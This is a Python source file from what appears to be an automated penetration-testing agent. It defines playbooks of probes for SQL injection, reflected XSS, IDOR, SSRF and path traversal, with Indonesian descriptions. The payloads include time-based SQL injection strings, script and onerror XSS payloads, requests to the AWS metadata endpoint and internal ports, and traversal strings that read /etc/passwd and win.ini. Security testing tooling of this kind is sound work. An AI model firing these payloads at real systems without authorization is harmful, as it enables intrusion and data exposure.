# packages/pentra-agent/pentra_agent/playbooks/registry.py

from .base import Playbook, PlaybookStep

PLAYBOOKS: dict[str, Playbook] = {

    "sqli_error": Playbook(
        name="SQL Injection — Error Based",
        vuln_class="SQL_INJECTION",
        description="Test parameter untuk SQL injection via error messages",
        priority=1,
        tech_stack_hints=["mssql", "mysql", "postgresql", "asp.net", "php", "rails"],
        url_patterns=["?id=", "?cat=", "?pid=", "?article=", "?user=", "?product="],
        steps=[
            PlaybookStep(
                name="Single Quote Probe",
                action="error_based_probe",
                payload_template="'",
                detect_pattern=r"sql|syntax|mysql|mssql|ora-|unterminated|quoted",
                description="Single quote biasanya memicu SQL error jika tidak di-sanitize",
            ),
            PlaybookStep(
                name="Double Quote Probe",
                action="error_based_probe",
                payload_template='"',
                detect_pattern=r"sql|syntax|mysql|mssql|error",
                description="Double quote untuk string-delimited queries",
            ),
            PlaybookStep(
                name="Boolean True Probe",
                action="boolean_probe",
                payload_template="' OR '1'='1",
                detect_pattern="response_change",
                description="Boolean injection — response harus berbeda dari baseline",
            ),
            PlaybookStep(
                name="Time-Based Probe (MSSQL)",
                action="time_based_probe",
                payload_template="'; WAITFOR DELAY '0:0:5'--",
                detect_pattern="delay_5s",
                description="Time delay probe untuk MSSQL — 5 detik delay = vulnerable",
            ),
            PlaybookStep(
                name="Time-Based Probe (MySQL)",
                action="time_based_probe",
                payload_template="' AND SLEEP(5)--",
                detect_pattern="delay_5s",
                description="Time delay probe untuk MySQL",
            ),
            PlaybookStep(
                name="Confirm with Burp",
                action="confirm_with_burp",
                payload_template="",
                detect_pattern="",
                description="Send ke Burp Repeater untuk manual verification + Intruder",
                requires_burp=True,
            ),
        ],
    ),

    "xss_reflected": Playbook(
        name="XSS — Reflected",
        vuln_class="XSS",
        description="Test parameter untuk reflected XSS",
        priority=2,
        tech_stack_hints=["php", "asp.net", "java", "rails", "django"],
        url_patterns=["?search=", "?q=", "?query=", "?name=", "?message=", "?input="],
        steps=[
            PlaybookStep(
                name="Marker Reflection Test",
                action="probe_reflection",
                payload_template="PENTRA_XSS_12345",
                detect_pattern="PENTRA_XSS_12345",
                description="Cek apakah input direfleksikan ke response",
            ),
            PlaybookStep(
                name="HTML Tag Injection",
                action="probe_reflection",
                payload_template="<b>PENTRA</b>",
                detect_pattern=r"<b>PENTRA</b>",
                description="Cek apakah HTML tag tidak di-escape",
            ),
            PlaybookStep(
                name="Script Tag Test",
                action="probe_reflection",
                payload_template="<script>alert('XSS')</script>",
                detect_pattern=r"<script>alert\('XSS'\)</script>",
                description="Basic XSS payload tanpa encoding",
            ),
            PlaybookStep(
                name="Event Handler Test",
                action="probe_reflection",
                payload_template='"><img src=x onerror=alert(1)>',
                detect_pattern=r"onerror=alert",
                description="Event handler injection untuk bypass quote filtering",
            ),
            PlaybookStep(
                name="CSP Check",
                action="manual_review",
                payload_template="",
                detect_pattern="content-security-policy",
                description="Cek Content-Security-Policy header — jika ada, perlu bypass",
            ),
        ],
    ),

    "idor": Playbook(
        name="IDOR — Insecure Direct Object Reference",
        vuln_class="IDOR",
        description="Test parameter ID untuk unauthorized object access",
        priority=1,
        tech_stack_hints=["rails", "django", "laravel", "spring", "express", "rest-api"],
        url_patterns=["?id=", "?user_id=", "?account_id=", "/users/", "/accounts/", "/orders/"],
        steps=[
            PlaybookStep(
                name="ID Increment Test",
                action="idor_probe",
                payload_template="{ID+1}",
                detect_pattern="response_change",
                description="Increment ID — response berbeda = IDOR potential",
            ),
            PlaybookStep(
                name="ID Decrement Test",
                action="idor_probe",
                payload_template="{ID-1}",
                detect_pattern="response_change",
                description="Decrement ID",
            ),
            PlaybookStep(
                name="Zero ID Test",
                action="idor_probe",
                payload_template="0",
                detect_pattern="response_change",
                description="ID=0 kadang mengembalikan semua records",
            ),
            PlaybookStep(
                name="Negative ID Test",
                action="idor_probe",
                payload_template="-1",
                detect_pattern="error_or_change",
                description="Negative ID untuk test boundary",
            ),
            PlaybookStep(
                name="UUID Manipulation",
                action="idor_probe",
                payload_template="00000000-0000-0000-0000-000000000001",
                detect_pattern="response_change",
                description="Untuk endpoint dengan UUID — test dengan known other user UUID",
            ),
        ],
    ),

    "ssrf": Playbook(
        name="SSRF — Server-Side Request Forgery",
        vuln_class="SSRF",
        description="Test URL/destination parameters untuk SSRF",
        priority=1,
        tech_stack_hints=["python", "ruby", "java", "php", "node"],
        url_patterns=["?url=", "?dest=", "?redirect=", "?uri=", "?path=", "?target=", "?src="],
        steps=[
            PlaybookStep(
                name="Internal IP Probe",
                action="probe_reflection",
                payload_template="http://127.0.0.1/",
                detect_pattern=r"localhost|127\.0\.0\.1|connection refused|refused",
                description="Test SSRF ke localhost",
            ),
            PlaybookStep(
                name="Cloud Metadata Probe",
                action="probe_reflection",
                payload_template="http://169.254.169.254/latest/meta-data/",
                detect_pattern=r"ami-id|instance-id|meta-data",
                description="AWS metadata endpoint — high impact jika berhasil",
            ),
            PlaybookStep(
                name="OOB Collaborator Probe",
                action="oob_probe",
                payload_template="http://{COLLABORATOR_PAYLOAD}/ssrf-test",
                detect_pattern="collaborator_dns",
                description="Out-of-band test via Burp Collaborator",
                requires_burp=True,
            ),
            PlaybookStep(
                name="Internal Port Scan",
                action="probe_reflection",
                payload_template="http://127.0.0.1:{PORT}/",
                detect_pattern="response_change",
                description="Scan internal ports via SSRF (6379=Redis, 5432=PostgreSQL)",
            ),
        ],
    ),

    "path_traversal": Playbook(
        name="Path Traversal / LFI",
        vuln_class="PATH_TRAVERSAL",
        description="Test file path parameters untuk directory traversal",
        priority=2,
        tech_stack_hints=["php", "python", "ruby", "java", "node"],
        url_patterns=["?file=", "?path=", "?page=", "?template=", "?include=", "?doc="],
        steps=[
            PlaybookStep(
                name="Basic Traversal (Linux)",
                action="probe_reflection",
                payload_template="../../../etc/passwd",
                detect_pattern=r"root:.*:/bin/",
                description="Linux /etc/passwd — definitive proof of LFI",
            ),
            PlaybookStep(
                name="Basic Traversal (Windows)",
                action="probe_reflection",
                payload_template="..\\..\\..\\windows\\win.ini",
                detect_pattern=r"\[fonts\]|\[extensions\]",
                description="Windows win.ini — definitive proof of LFI",
            ),
            PlaybookStep(
                name="URL Encoded Traversal",
                action="probe_reflection",
                payload_template="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                detect_pattern=r"root:.*:/bin/",
                description="URL encoded untuk bypass simple filters",
            ),
            PlaybookStep(
                name="Double Encoded Traversal",
                action="probe_reflection",
                payload_template="..%252f..%252f..%252fetc%252fpasswd",
                detect_pattern=r"root:.*:/bin/",
                description="Double encoding bypass",
            ),
        ],
    ),
}


def get_playbook_for_context(
    tech_stack: list[str],
    url: str,
    param: str,
) -> list[Playbook]:
    """Return playbooks relevant to the given context, sorted by relevance.

    Scoring:
    - +2 per tech stack hint that matches an item in ``tech_stack``
    - +3 per URL pattern that appears in ``url?param``

    Sorted by score descending then priority ascending (1=highest).
    Only playbooks with score > 0 are returned.
    """
    relevant: list[tuple[int, Playbook]] = []
    url_lower = (url + "?" + param).lower()

    for playbook in PLAYBOOKS.values():
        score = 0

        for hint in playbook.tech_stack_hints:
            if any(hint in t.lower() for t in tech_stack):
                score += 2

        for pattern in playbook.url_patterns:
            if pattern.lower() in url_lower:
                score += 3

        if score > 0:
            relevant.append((score, playbook))

    relevant.sort(key=lambda x: (-x[0], x[1].priority))
    return [p for _, p in relevant]
